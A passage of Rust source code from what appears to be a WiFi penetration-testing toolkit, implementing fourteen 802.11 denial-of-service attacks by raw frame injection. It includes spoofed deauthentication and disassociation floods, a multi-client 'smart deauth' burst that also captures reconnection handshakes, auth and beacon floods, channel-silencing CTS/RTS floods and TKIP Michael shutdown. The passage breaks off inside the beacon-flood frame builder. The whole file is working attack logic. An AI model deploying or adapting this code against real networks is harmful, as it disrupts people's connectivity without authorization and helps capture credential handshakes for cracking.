//! DoS attacks — 14 attack types for WiFi denial-of-service.
//!
//! All types use frame injection via SharedAdapter. The attack runs on its own
//! thread, crafting and transmitting frames in a tight loop. Each frame type
//! targets a different layer of the WiFi protocol stack:
//!
//! **Deauth/Disassoc** (management frame floods):
//!   - DeauthFlood: broadcast deauth spoofed from AP
//!   - DeauthTargeted: bidirectional deauth (AP↔client)
//!   - DisassocFlood: broadcast disassociation
//!
//! **State table exhaustion** (fake client floods):
//!   - AuthFlood: random MAC auth requests exhaust AP state table
//!   - AssocFlood: random MAC assoc requests exhaust AP associations
//!
//! **Beacon/Probe pollution**:
//!   - BeaconFlood: fake APs with random/custom SSIDs
//!   - ProbeFlood: probe requests from random MACs
//!
//! **NAV reservation abuse** (control frame floods):
//!   - CtsFlood: CTS-to-self with max duration silences channel
//!   - RtsFlood: RTS with max duration from random MACs
//!
//! **Protocol-specific attacks**:
//!   - MichaelShutdown: TKIP MIC failure triggers 60s AP shutdown
//!   - SaQueryFlood: 802.11w SA Query floods
//!   - CsaAbuse: fake CSA beacons force channel switch
//!   - BssTransition: 802.11v WNM forces client roaming
//!   - PowerSave: fake PM=1 frames cause AP to buffer victim's traffic
//!
//! Architecture (SharedAdapter):
//!   The attack locks the channel to the target AP's channel. The scanner
//!   pauses hopping but keeps processing frames on the locked channel.
//!   DoS attacks are TX-only (no RX state machine) — simpler than PMKID.
//!   The scanner running on the locked channel lets the CLI show which
//!   clients drop off during the attack.
//!
//! Ported from `wifi-map/libwifikit/attacks/attack_dos.c`.

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

use crate::adapter::SharedAdapter;
use crate::attacks::next_attack_id;
use crate::core::{EventRing, MacAddress, TxOptions};
use crate::core::chip::ChipCaps;
use crate::store::{Ap, Station};
use crate::store::update::{
    AttackId, AttackType, AttackPhase, AttackEventKind, AttackResult, StoreUpdate,
};
use crate::protocol::frames;
use crate::protocol::ieee80211::{
    ReasonCode, StatusCode, auth_algo, cap_info, fc, fc_flags,
};

// ═══════════════════════════════════════════════════════════════════════════════
//  DoS Attack Types
// ═══════════════════════════════════════════════════════════════════════════════

/// The 14 DoS attack types.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DosType {
    /// Broadcast deauth spoofed from AP — all clients disconnect.
    DeauthFlood,
    /// Bidirectional deauth between AP and specific client.
    DeauthTargeted,
    /// Broadcast disassociation — forces all clients to re-associate.
    DisassocFlood,
    /// Auth requests from random MACs — exhausts AP state table.
    AuthFlood,
    /// Assoc requests from random MACs — exhausts AP associations.
    AssocFlood,
    /// Fake beacon frames with random SSIDs — pollutes AP lists.
    BeaconFlood,
    /// Probe requests from random MACs — wastes AP airtime.
    ProbeFlood,
    /// CTS-to-self with max duration — silences channel via NAV.
    CtsFlood,
    /// RTS with max duration from random MACs — NAV reservation abuse.
    RtsFlood,
    /// TKIP MIC failure frames — triggers 60s AP shutdown.
    MichaelShutdown,
    /// 802.11w SA Query floods — PMF-enabled AP attack.
    SaQueryFlood,
    /// Fake CSA beacons — force clients to switch channels.
    CsaAbuse,
    /// 802.11v BSS Transition requests — force client roaming.
    BssTransition,
    /// Fake PM=1 null data — AP buffers victim's traffic.
    PowerSave,
}

impl DosType {
    /// Human-readable name for display.
    pub fn label(&self) -> &'static str {
        match self {
            Self::DeauthFlood => "deauth-flood",
            Self::DeauthTargeted => "deauth-targeted",
            Self::DisassocFlood => "disassoc-flood",
            Self::AuthFlood => "auth-flood",
            Self::AssocFlood => "assoc-flood",
            Self::BeaconFlood => "beacon-flood",
            Self::ProbeFlood => "probe-flood",
            Self::CtsFlood => "cts-flood",
            Self::RtsFlood => "rts-flood",
            Self::MichaelShutdown => "michael-shutdown",
            Self::SaQueryFlood => "sa-query-flood",
            Self::CsaAbuse => "csa-abuse",
            Self::BssTransition => "bss-transition",
            Self::PowerSave => "power-save",
        }
    }

    /// Parse from string (CLI input).
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "deauth" | "deauth-flood" => Some(Self::DeauthFlood),
            "deauth-targeted" | "deauth-target" => Some(Self::DeauthTargeted),
            "disassoc" | "disassoc-flood" => Some(Self::DisassocFlood),
            "auth" | "auth-flood" => Some(Self::AuthFlood),
            "assoc" | "assoc-flood" => Some(Self::AssocFlood),
            "beacon" | "beacon-flood" => Some(Self::BeaconFlood),
            "probe" | "probe-flood" => Some(Self::ProbeFlood),
            "cts" | "cts-flood" => Some(Self::CtsFlood),
            "rts" | "rts-flood" => Some(Self::RtsFlood),
            "michael" | "michael-shutdown" => Some(Self::MichaelShutdown),
            "sa-query" | "sa-query-flood" => Some(Self::SaQueryFlood),
            "csa" | "csa-abuse" => Some(Self::CsaAbuse),
            "bss-transition" | "bss-trans" | "wnm" => Some(Self::BssTransition),
            "power-save" | "ps" => Some(Self::PowerSave),
            _ => None,
        }
    }

    /// Does this attack type require a specific client station target?
    pub fn requires_station(&self) -> bool {
        matches!(
            self,
            Self::DeauthTargeted | Self::MichaelShutdown | Self::PowerSave
        )
    }

    /// Description of what this attack does.
    pub fn description(&self) -> &'static str {
        match self {
            Self::DeauthFlood => "Broadcast deauth from spoofed AP — all clients disconnect",
            Self::DeauthTargeted => "Bidirectional deauth between AP and client",
            Self::DisassocFlood => "Broadcast disassociation — forces re-association",
            Self::AuthFlood => "Random MAC auth requests — exhausts AP state table",
            Self::AssocFlood => "Random MAC assoc requests — exhausts AP associations",
            Self::BeaconFlood => "Fake beacons with random SSIDs — pollutes AP lists",
            Self::ProbeFlood => "Probe requests from random MACs — wastes AP airtime",
            Self::CtsFlood => "CTS-to-self with max NAV — silences entire channel",
            Self::RtsFlood => "RTS with max NAV from random MACs — channel reservation abuse",
            Self::MichaelShutdown => "TKIP MIC failure — triggers 60-second AP shutdown",
            Self::SaQueryFlood => "SA Query floods — attacks PMF-enabled APs",
            Self::CsaAbuse => "Fake CSA beacons — forces channel switch",
            Self::BssTransition => "BSS Transition requests — forces client roaming",
            Self::PowerSave => "Fake PM=1 frames — AP buffers victim traffic",
        }
    }

    /// All 14 types, for help display.
    pub fn all() -> &'static [DosType] {
        &[
            Self::DeauthFlood, Self::DeauthTargeted, Self::DisassocFlood,
            Self::AuthFlood, Self::AssocFlood,
            Self::BeaconFlood, Self::ProbeFlood,
            Self::CtsFlood, Self::RtsFlood,
            Self::MichaelShutdown, Self::SaQueryFlood, Self::CsaAbuse,
            Self::BssTransition, Self::PowerSave,
        ]
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  DoS Params — behavior configuration only (no target fields)
// ═══════════════════════════════════════════════════════════════════════════════

/// DoS attack parameters. Target comes from the scanner's Ap struct.
#[allow(dead_code)]
#[derive(Clone, Debug)]
pub struct DosParams {
    // === Attack selection ===
    /// Which DoS type to execute. Default: DeauthFlood.
    pub attack_type: DosType,

    // === Timing ===
    /// Delay between frames in microseconds. 0 = as fast as possible (1ms min).
    /// Default: 0 (max rate).
    pub interval: Duration,
    /// Wait after channel lock for PLL/AGC stabilization. Default: 50ms.
    pub channel_settle: Duration,
    /// Overall attack duration (0 = infinite, until manually stopped). Default: 0.
    pub duration: Duration,

    // === Limits ===
    /// Max frames to send (0 = unlimited). Default: 0.
    pub max_frames: u64,
    /// Number of frames per burst (sent without interval). Default: 1.
    pub burst_count: u32,
    /// Pause between bursts (0 = no pause, continuous). Default: 0.
    /// For /deauth: 3s pause between bursts for a measured approach.
    /// For /dos: 0 (continuous flood).
    pub burst_pause: Duration,

    // === Behavior ===
    /// Deauth/disassoc reason code. Default: 7 (Class3FromNonAssoc).
    pub reason_code: u16,
    /// CSA target channel (for CsaAbuse). Default: 13.
    pub csa_channel: u8,
    /// Custom SSID list for beacon flood. Default: empty (random names).
    pub ssid_list: Vec<String>,
    /// RX poll timeout for frame reception. Default: 200ms.
    pub rx_poll_timeout: Duration,
    /// Cooldown duration after attack stops — stay on channel to capture
    /// late reconnections. Clients deauthed near the end may take several
    /// seconds to complete auth→assoc→EAPOL. Default: 0 (no cooldown).
    /// For /deauth: 15s cooldown to catch stragglers.
    pub cooldown: Duration,
}

impl Default for DosParams {
    fn default() -> Self {
        Self {
            attack_type: DosType::DeauthFlood,
            interval: Duration::ZERO,
            channel_settle: Duration::from_millis(50),
            duration: Duration::ZERO,
            max_frames: 0,
            burst_count: 1,
            burst_pause: Duration::ZERO,
            reason_code: 7, // Class3FromNonAssoc
            csa_channel: 13,
            ssid_list: Vec::new(),
            rx_poll_timeout: Duration::from_millis(200),
            cooldown: Duration::ZERO,
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  DoS Attack Phase
// ═══════════════════════════════════════════════════════════════════════════════

/// Current attack phase.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DosPhase {
    /// Initial state — not started.
    Idle,
    /// Locking channel to target AP.
    ChannelLock,
    /// Actively sending frames.
    Flooding,
    /// Cooldown — TX stopped, channel still locked, capturing late reconnections.
    Cooldown,
    /// Attack completed or stopped.
    Done,
}

impl DosPhase {
    /// Convert to the normalized AttackPhase for delta emission.
    fn to_attack_phase(&self) -> AttackPhase {
        match self {
            Self::Idle => AttackPhase { label: "Idle", is_active: false, is_terminal: false },
            Self::ChannelLock => AttackPhase { label: "ChannelLock", is_active: true, is_terminal: false },
            Self::Flooding => AttackPhase { label: "Flooding", is_active: true, is_terminal: false },
            Self::Cooldown => AttackPhase { label: "Cooldown", is_active: true, is_terminal: false },
            Self::Done => AttackPhase { label: "Done", is_active: false, is_terminal: true },
        }
    }
}

impl Default for DosPhase {
    fn default() -> Self {
        Self::Idle
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  DoS Attack Info — real-time state snapshot
// ═══════════════════════════════════════════════════════════════════════════════

/// Real-time info snapshot for the CLI to render.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct DosInfo {
    // === State ===
    pub phase: DosPhase,
    pub running: bool,
    pub attack_type: DosType,

    // === Target ===
    pub target_bssid: MacAddress,
    pub target_ssid: String,
    pub target_channel: u8,
    pub target_rssi: i8,
    /// Specific station target (for DeauthTargeted, MichaelShutdown, PowerSave).
    pub target_station: Option<MacAddress>,

    // === Counters ===
    pub frames_sent: u64,
    pub frames_received: u64,
    pub bytes_sent: u64,

    // === TX Feedback (ACK/NACK from firmware) ===
    pub tx_feedback: crate::core::TxFeedbackSnapshot,

    // === Timing ===
    pub start_time: Instant,
    pub elapsed: Duration,
    pub frames_per_sec: f64,

    // === Cooldown ===
    /// When cooldown phase started (None if not in cooldown).
    pub cooldown_start: Option<Instant>,
    /// Total cooldown duration.
    pub cooldown_duration: Duration,

    // === Result ===
    pub stop_reason: Option<StopReason>,
    pub final_result: Option<DosFinalResult>,
}

impl Default for DosInfo {
    fn default() -> Self {
        Self {
            phase: DosPhase::Idle,
            running: false,
            attack_type: DosType::DeauthFlood,
            target_bssid: MacAddress::ZERO,
            target_ssid: String::new(),
            target_channel: 0,
            target_rssi: -100,
            target_station: None,
            frames_sent: 0,
            frames_received: 0,
            bytes_sent: 0,
            tx_feedback: Default::default(),
            start_time: Instant::now(),
            elapsed: Duration::ZERO,
            frames_per_sec: 0.0,
            cooldown_start: None,
            cooldown_duration: Duration::ZERO,
            stop_reason: None,
            final_result: None,
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  DoS Attack Events — discrete things that happened
// ═══════════════════════════════════════════════════════════════════════════════

/// Discrete event fired during the DoS attack.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct DosEvent {
    pub seq: u64,
    pub timestamp: Duration,
    pub kind: DosEventKind,
}

/// What happened.
#[derive(Debug, Clone)]
pub enum DosEventKind {
    /// Attack started against target.
    AttackStarted {
        attack_type: DosType,
        bssid: MacAddress,
        ssid: String,
        channel: u8,
        station: Option<MacAddress>,
    },
    /// Channel locked for attack.
    ChannelLocked { channel: u8 },
    /// Flooding started.
    FloodingStarted,
    /// Rate snapshot (emitted every second).
    RateSnapshot {
        frames_sent: u64,
        frames_per_sec: f64,
        elapsed: Duration,
        bytes_sent: u64,
    },
    /// Burst complete, pausing before next burst.
    BurstPause {
        burst_num: u32,
        frames_in_burst: u64,
        pause_secs: f64,
    },
    /// Attack complete (stopped or duration/count reached).
    AttackComplete {
        frames_sent: u64,
        elapsed: Duration,
        reason: StopReason,
    },
    /// Cooldown started — TX stopped, capturing late reconnections.
    CooldownStarted { duration_secs: f64 },
    /// Channel unlocked — scanner resumes hopping.
    ChannelUnlocked,
    /// Non-fatal error during attack.
    Error { message: String },
}

/// Why the attack stopped.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum StopReason {
    /// User pressed Ctrl+C or /attack stop.
    UserStopped,
    /// Duration limit reached.
    DurationReached,
    /// Frame count limit reached.
    FrameCountReached,
    /// Channel lock failed.
    ChannelError,
}

// ═══════════════════════════════════════════════════════════════════════════════
//  DosFinalResult — aggregate result after completion
// ═══════════════════════════════════════════════════════════════════════════════

/// Final result of a DoS attack, stored in DosInfo after completion.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct DosFinalResult {
    pub attack_type: DosType,
    pub target_bssid: MacAddress,
    pub target_ssid: String,
    pub target_channel: u8,
    pub frames_sent: u64,
    pub bytes_sent: u64,
    pub elapsed: Duration,
    pub frames_per_sec: f64,
    pub stop_reason: StopReason,
}

// ═══════════════════════════════════════════════════════════════════════════════
//  DosAttack — the attack engine (SharedAdapter architecture)
// ═══════════════════════════════════════════════════════════════════════════════

/// DoS attack engine.
///
/// Uses SharedAdapter for all adapter access. Spawns its own thread via start().
/// The scanner keeps running alongside — channel contention is managed by the
/// SharedAdapter's channel lock mechanism.
pub struct DosAttack {
    params: DosParams,
    info: Arc<Mutex<DosInfo>>,
    events: Arc<EventRing<DosEvent>>,
    running: Arc<AtomicBool>,
    done: Arc<AtomicBool>,
    /// Live client list — updated by CLI poll loop from scanner data.
    /// The attack thread reads this to target unicast deauths at every known client.
    live_clients: Arc<Mutex<Vec<MacAddress>>>,
}

impl DosAttack {
    pub fn new(params: DosParams) -> Self {
        Self {
            params,
            info: Arc::new(Mutex::new(DosInfo::default())),
            events: Arc::new(EventRing::new(1024)),
            running: Arc::new(AtomicBool::new(false)),
            done: Arc::new(AtomicBool::new(false)),
            live_clients: Arc::new(Mutex::new(Vec::new())),
        }
    }

    /// Update the live client list from scanner data.
    /// Called by the CLI poll loop every render cycle.
    pub fn update_clients(&self, clients: Vec<MacAddress>) {
        let mut lc = self.live_clients.lock().unwrap_or_else(|e| e.into_inner());
        *lc = clients;
    }

    /// Start the DoS attack on a background thread.
    ///
    /// `target` is the AP from the scanner. `target_station` is an optional
    /// specific client for targeted attacks (DeauthTargeted, MichaelShutdown, PowerSave).
    pub fn start(&self, shared: SharedAdapter, target: Ap, target_station: Option<Station>) {
        let info = Arc::clone(&self.info);
        let events = Arc::clone(&self.events);
        let running = Arc::clone(&self.running);
        let done = Arc::clone(&self.done);
        let params = self.params.clone();

        running.store(true, Ordering::SeqCst);
        done.store(false, Ordering::SeqCst);
        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.running = true;
            info.start_time = Instant::now();
            info.phase = DosPhase::ChannelLock;
            info.attack_type = params.attack_type;
            info.target_bssid = target.bssid;
            info.target_ssid = target.ssid.clone();
            info.target_channel = target.channel;
            info.target_rssi = target.rssi;
            info.target_station = target_station.as_ref().map(|s| s.mac);
        }

        let target_clone = target;
        let station_mac = target_station.map(|s| s.mac);
        let live_clients = Arc::clone(&self.live_clients);

        thread::Builder::new()
            .name("dos".into())
            .spawn(move || {
                let reader = shared.subscribe("dos");
                run_dos_attack(&shared, &reader, &target_clone, station_mac, &params, &info, &events, &running, &live_clients);
                running.store(false, Ordering::SeqCst);
                done.store(true, Ordering::SeqCst);
                {
                    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                    info.running = false;
                    info.phase = DosPhase::Done;
                }
            })
            .expect("failed to spawn dos thread");
    }

    /// Signal the attack to stop. Non-blocking.
    pub fn signal_stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    /// Check if the attack has finished.
    pub fn is_done(&self) -> bool {
        self.done.load(Ordering::SeqCst)
    }

    /// Check if the attack is currently running.
    #[allow(dead_code)]
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }

    /// Get current info snapshot for rendering.
    pub fn info(&self) -> DosInfo {
        self.info.lock().unwrap_or_else(|e| e.into_inner()).clone()
    }

    /// Drain new events since last call.
    pub fn events(&self) -> Vec<DosEvent> {
        self.events.drain()
    }

    /// Human-readable name.
    #[allow(dead_code)]
    pub fn name(&self) -> &'static str {
        "dos"
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Attack logic — runs on its own thread via start()
// ═══════════════════════════════════════════════════════════════════════════════

fn run_dos_attack(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    target: &Ap,
    target_station: Option<MacAddress>,
    params: &DosParams,
    info: &Arc<Mutex<DosInfo>>,
    events: &Arc<EventRing<DosEvent>>,
    running: &Arc<AtomicBool>,
    live_clients: &Arc<Mutex<Vec<MacAddress>>>,
) {
    let start = Instant::now();
    let our_mac = shared.mac();
    let tx_fb = shared.tx_feedback();
    tx_fb.reset();
    let attack_id = next_attack_id();

    // Emit AttackStarted into the delta stream
    shared.emit_updates(vec![StoreUpdate::AttackStarted {
        id: attack_id,
        attack_type: AttackType::Dos,
        target_bssid: target.bssid,
        target_ssid: target.ssid.clone(),
        target_channel: target.channel,
    }]);

    // Fire attack started event
    push_event(shared, events, start, DosEventKind::AttackStarted {
        attack_type: params.attack_type,
        bssid: target.bssid,
        ssid: target.ssid.clone(),
        channel: target.channel,
        station: target_station,
    }, attack_id);

    // Lock channel to target's channel
    if let Err(e) = shared.lock_channel(target.channel, "dos") {
        push_event(shared, events, start, DosEventKind::Error {
            message: format!("Failed to lock channel {}: {}", target.channel, e),
        }, attack_id);
        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.stop_reason = Some(StopReason::ChannelError);
        }
        push_event(shared, events, start, DosEventKind::AttackComplete {
            frames_sent: 0,
            elapsed: start.elapsed(),
            reason: StopReason::ChannelError,
        }, attack_id);
        // Emit AttackComplete for early exit
        shared.emit_updates(vec![StoreUpdate::AttackComplete {
            id: attack_id,
            attack_type: AttackType::Dos,
            result: AttackResult::Dos {
                frames_sent: 0,
                stop_reason: StopReason::ChannelError,
            },
        }]);
        return;
    }
    push_event(shared, events, start, DosEventKind::ChannelLocked { channel: target.channel }, attack_id);

    // Enable active monitor for target AP (beamformee + ACK on supporting adapters)
    shared.set_attack_target(&target.bssid.0);

    // Channel settle — wait for PLL lock + AGC
    thread::sleep(params.channel_settle);

    // Update phase to flooding
    update_phase(shared, info, DosPhase::Flooding, attack_id);
    push_event(shared, events, start, DosEventKind::FloodingStarted, attack_id);

    // TX options: maximum range + channel clearing
    //   - CCK 1M on 2.4GHz, HE_EXT_SU MCS0 on 5/6GHz (WiFi 6), OFDM 6M fallback
    //   - LDPC + STBC for coding/diversity gain
    //   - PROTECT (RTS/CTS) clears channel before deauth — forces NAV on all STAs
    //   - NO_ACK: broadcast-class, retries handled by burst repetition
    let has_he = shared.caps().contains(ChipCaps::HE);
    let tx_opts = TxOptions::max_range_noack(target.channel, has_he);

    // Rate tracking: snapshot every second
    let mut rate_start = Instant::now();
    let mut rate_checkpoint: u64 = 0;
    let mut frames_sent: u64 = 0;
    let mut bytes_sent: u64 = 0;
    // Track time spent in burst pause (listen window) so fps excludes it.
    // Frame interval pacing (1ms between frames) IS included — that's real throughput.
    // Burst pause (2s listen window in deauth mode) is NOT included — that's waiting.
    let mut pause_time_in_window = Duration::ZERO;

    // Simple RNG state for random MACs and SSIDs
    let mut rng_state: u32 = (start.elapsed().as_nanos() as u32) ^ 0xDEAD_BEEF;
    let mut burst_num: u32 = 0;
    let mut frames_in_burst: u64 = 0;

    // Minimum interval between frames to avoid USB congestion
    let frame_interval = if params.interval > Duration::ZERO {
        params.interval
    } else {
        Duration::from_millis(1)
    };

    // Main flooding loop
    while running.load(Ordering::SeqCst) {
        // Check duration limit
        if params.duration > Duration::ZERO && start.elapsed() >= params.duration {
            store_final_result(info, params, target, frames_sent, bytes_sent, start, StopReason::DurationReached);
            push_event(shared, events, start, DosEventKind::AttackComplete {
                frames_sent,
                elapsed: start.elapsed(),
                reason: StopReason::DurationReached,
            }, attack_id);
            break;
        }

        // Check frame count limit
        if params.max_frames > 0 && frames_sent >= params.max_frames {
            store_final_result(info, params, target, frames_sent, bytes_sent, start, StopReason::FrameCountReached);
            push_event(shared, events, start, DosEventKind::AttackComplete {
                frames_sent,
                elapsed: start.elapsed(),
                reason: StopReason::FrameCountReached,
            }, attack_id);
            break;
        }

        // ── Smart deauth: build full burst targeting all known clients ──
        let is_deauth_type = matches!(params.attack_type,
            DosType::DeauthFlood | DosType::DeauthTargeted | DosType::DisassocFlood);

        if is_deauth_type {
            // Get current client list from scanner (lock-free read)
            let clients: Vec<MacAddress> = {
                let lc = live_clients.lock().unwrap_or_else(|e| e.into_inner());
                lc.clone()
            };

            // Build the smart burst: all frame types, all clients, both directions
            let burst_frames = build_smart_deauth_burst(
                &target.bssid,
                &clients,
                target_station.as_ref(),
                target,
                burst_num,
            );

            // Send every frame in the burst
            for frame_data in &burst_frames {
                if !running.load(Ordering::SeqCst) {
                    break;
                }
                if shared.tx_frame(frame_data, &tx_opts).is_ok() {
                    frames_sent += 1;
                    bytes_sent += frame_data.len() as u64;
                }
            }
        } else {
            // Non-deauth attacks: single frame per iteration (original path)
            for _ in 0..params.burst_count {
                if !running.load(Ordering::SeqCst) {
                    break;
                }

                let frame = build_dos_frame(
                    params.attack_type,
                    &target.bssid,
                    &target.ssid,
                    target.channel,
                    target_station.as_ref(),
                    &our_mac,
                    params,
                    &mut rng_state,
                    frames_sent,
                );

                if let Some(frame_data) = &frame {
                    if shared.tx_frame(frame_data, &tx_opts).is_ok() {
                        frames_sent += 1;
                        bytes_sent += frame_data.len() as u64;
                    }
                }
            }
        }

        // Update rate every second
        let rate_elapsed = rate_start.elapsed();
        if rate_elapsed >= Duration::from_secs(1) {
            let delta = frames_sent - rate_checkpoint;
            // Exclude burst pause time (listen windows) from fps calculation.
            // Frame interval pacing (1ms) is kept — it's real throughput.
            let active_secs = rate_elapsed.saturating_sub(pause_time_in_window).as_secs_f64();
            let fps = if active_secs > 0.0001 { delta as f64 / active_secs } else { 0.0 };
            rate_checkpoint = frames_sent;
            rate_start = Instant::now();
            pause_time_in_window = Duration::ZERO;

            // Update info
            {
                let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                info.frames_sent = frames_sent;
                info.bytes_sent = bytes_sent;
                info.elapsed = start.elapsed();
                info.frames_per_sec = fps;
                info.tx_feedback = tx_fb.snapshot();
            }

            // Fire rate snapshot event
            push_event(shared, events, start, DosEventKind::RateSnapshot {
                frames_sent,
                frames_per_sec: fps,
                elapsed: start.elapsed(),
                bytes_sent,
            }, attack_id);

            // Emit batched counters into the delta stream (~1x/sec)
            emit_counters(shared, attack_id, info, start, &tx_fb);
        }

        // Track frames in current burst
        frames_in_burst += params.burst_count as u64;

        // Burst pause: after burst_count frames, pause for burst_pause duration
        if params.burst_pause > Duration::ZERO && frames_in_burst >= params.burst_count as u64 {
            burst_num += 1;

            // Update info for visual feedback during pause
            {
                let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                info.frames_sent = frames_sent;
                info.bytes_sent = bytes_sent;
                info.elapsed = start.elapsed();
            }

            push_event(shared, events, start, DosEventKind::BurstPause {
                burst_num,
                frames_in_burst,
                pause_secs: params.burst_pause.as_secs_f64(),
            }, attack_id);

            // Pause — check running flag every 100ms so Ctrl+C is responsive
            // Drain RX frames during pause — capture handshakes from reconnecting clients
            // Midway through pause, send QoS Null stimulation to wake sleeping clients
            // so the next deauth burst hits active radios.
            let pause_start = Instant::now();
            let mut stimulated_this_pause = false;
            while running.load(Ordering::SeqCst) && pause_start.elapsed() < params.burst_pause {
                for _frame in reader.drain() {
                    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                    info.frames_received += 1;
                }

                // Stimulate midway through the pause (after 1s)
                if !stimulated_this_pause && pause_start.elapsed() >= Duration::from_secs(1) {
                    let clients: Vec<MacAddress> = {
                        let lc = live_clients.lock().unwrap_or_else(|e| e.into_inner());
                        lc.clone()
                    };
                    // Broadcast QoS Null
                    let stim = frames::build_qos_null_stimulation(&MacAddress::BROADCAST, &target.bssid);
                    if shared.tx_frame(&stim, &tx_opts).is_ok() {
                        frames_sent += 1;
                        bytes_sent += stim.len() as u64;
                    }
                    // Unicast to each known client
                    for client_mac in &clients {
                        let stim = frames::build_qos_null_stimulation(client_mac, &target.bssid);
                        if shared.tx_frame(&stim, &tx_opts).is_ok() {
                            frames_sent += 1;
                            bytes_sent += stim.len() as u64;
                        }
                    }
                    stimulated_this_pause = true;
                }

                thread::sleep(Duration::from_millis(100));
            }
            pause_time_in_window += pause_start.elapsed();
            frames_in_burst = 0;
        } else {
            // Normal frame interval
            thread::sleep(frame_interval);
        }
    }

    // Determine the stop reason for this run
    let stop_reason = if !running.load(Ordering::SeqCst) {
        Some(StopReason::UserStopped)
    } else {
        // Already handled by the break above (DurationReached or FrameCountReached)
        None
    };

    // If we exited because running was set to false (user stop), fire event
    if let Some(reason) = stop_reason {
        store_final_result(info, params, target, frames_sent, bytes_sent, start, reason);
        push_event(shared, events, start, DosEventKind::AttackComplete {
            frames_sent,
            elapsed: start.elapsed(),
            reason,
        }, attack_id);
    }

    // Final info update
    {
        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.frames_sent = frames_sent;
        info.bytes_sent = bytes_sent;
        info.elapsed = start.elapsed();
        info.tx_feedback = tx_fb.snapshot();
    }

    // Cooldown phase — TX stopped, channel still locked.
    // Clients deauthed near the end need time to complete auth→assoc→EAPOL.
    // The scanner is still running on the locked channel, capturing everything.
    if params.cooldown > Duration::ZERO {
        update_phase(shared, info, DosPhase::Cooldown, attack_id);
        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.cooldown_start = Some(Instant::now());
            info.cooldown_duration = params.cooldown;
        }
        push_event(shared, events, start, DosEventKind::CooldownStarted {
            duration_secs: params.cooldown.as_secs_f64(),
        }, attack_id);

        let cooldown_start = Instant::now();
        while cooldown_start.elapsed() < params.cooldown {
            // Drain frames to keep reader current (scanner does the real processing)
            for _frame in reader.drain() {
                let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                info.frames_received += 1;
            }
            thread::sleep(Duration::from_millis(100));
        }
    }

    // Emit final counters before completing
    emit_counters(shared, attack_id, info, start, &tx_fb);

    // Unlock channel — scanner resumes hopping
    shared.unlock_channel();
    push_event(shared, events, start, DosEventKind::ChannelUnlocked, attack_id);

    // Determine the final stop reason for AttackComplete
    let final_reason = {
        let info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.stop_reason.unwrap_or(StopReason::UserStopped)
    };

    // Emit AttackComplete with final results
    shared.emit_updates(vec![StoreUpdate::AttackComplete {
        id: attack_id,
        attack_type: AttackType::Dos,
        result: AttackResult::Dos {
            frames_sent,
            stop_reason: final_reason,
        },
    }]);
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Frame crafting — builds the right frame for each DoS type
// ═══════════════════════════════════════════════════════════════════════════════

/// Build a DoS frame for the given attack type.
///
/// Uses protocol::frames builders where available (deauth, disassoc, auth,
/// assoc, beacon, probe). Inline crafting for control frames (CTS, RTS)
/// and protocol-specific attacks (SA Query, CSA, BSS Transition, Power Save,
/// Michael MIC failure).
fn build_dos_frame(
    attack_type: DosType,
    bssid: &MacAddress,
    ssid: &str,
    channel: u8,
    target_station: Option<&MacAddress>,
    our_mac: &MacAddress,
    params: &DosParams,
    rng: &mut u32,
    frame_count: u64,
) -> Option<Vec<u8>> {
    let reason = ReasonCode::from_u16(params.reason_code)
        .unwrap_or(ReasonCode::Class3FromNonAssoc);

    match attack_type {
        DosType::DeauthFlood => {
            // Broadcast deauth spoofed from AP
            Some(frames::build_deauth(bssid, &MacAddress::BROADCAST, bssid, reason))
        }

        DosType::DeauthTargeted => {
            // AP → client direction (reverse is sent separately in the loop)
            let station = target_station?;
            Some(frames::build_deauth(bssid, station, bssid, reason))
        }

        DosType::DisassocFlood => {
            // Broadcast disassociation spoofed from AP
            Some(frames::build_disassoc(bssid, &MacAddress::BROADCAST, bssid, reason))
        }

        DosType::AuthFlood => {
            // Auth requests from random MACs to exhaust AP state table
            let fake_mac = random_mac(rng);
            Some(frames::build_auth(
                &fake_mac, bssid, auth_algo::OPEN_SYSTEM, 1, StatusCode::Success,
            ))
        }

        DosType::AssocFlood => {
            // Assoc requests from random MACs
            let fake_mac = random_mac(rng);
            // Minimal IEs: empty SSID + basic rates
            let mut ies = Vec::with_capacity(16);
            ies.extend_from_slice(&[0x00, 0x00]); // SSID: empty
            ies.extend_from_slice(&[0x01, 0x04, 0x82, 0x84, 0x8B, 0x96]); // Supported Rates
            frames::build_assoc_request(&fake_mac, bssid, cap_info::BASE, 0, &ies)
        }

        DosType::BeaconFlood => {
            // Fake beacons with random BSSID + SSID
            let fake_bssid = random_mac(rng);
            let fake_ssid = if !params.ssid_list.is_empty() {
                let idx = (frame_count as usize) % params.ssid_list.len();
                params.ssid_list[idx].clone()
            } else {
                format!("Free_{:04X}", xorshift(rng) & 0xFFFF)
            };

            // IEs: SSID + Supported Rates + DS Parameter Set
            let mut ies = Vec::with_capacity(64);
            // SSID IE
            let ssid_bytes = fake_ssid.as_bytes();
            let slen = ssid_bytes.len().min(32) as u8;
            ies.push(0x00); // SSID tag
            ies.push(slen);
